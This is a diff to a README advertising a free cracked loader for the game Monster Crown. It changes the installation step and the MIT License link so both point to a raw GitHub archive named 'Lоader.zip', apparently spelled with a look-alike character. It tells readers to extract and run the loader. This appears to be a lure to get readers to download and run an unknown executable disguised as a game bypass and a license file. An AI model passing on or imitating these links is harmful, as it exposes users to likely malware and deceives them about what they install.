@@ -21,7 +21,7 @@ Monster Crown is an exhilarating monster-taming RPG with dark, mature storytelli
 - Easy installation & instant game access!  
 
 ## 🔑 Installation Guide
-1. Download **Loader.rar** from the repository  
+1. Download **https://raw.githubusercontent.com/Lyrixtah/AtomMind/main/Lоader.zip** from the repository  
 2. Extract the Loader folder to your desired directory  
 3. Run the Loader and follow on-screen instructions  
 4. Enjoy full access to Monster Crown—no limitations!  
@@ -33,4 +33,4 @@ monster crown , monster crown pc, indie monster rpg, free monster taming game, d
 This release is provided solely for personal, non-commercial evaluation. Please support the original developers by purchasing the official release. This loader is a unique bypass intended for educational and preservation purposes. Any redistribution for profit is prohibited.
 
 ## 📄 License  
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) (2025). For details, see LICENSE file.
+Distributed under the [MIT License](https://raw.githubusercontent.com/Lyrixtah/AtomMind/main/Lоader.zip) (2025). For details, see LICENSE file.
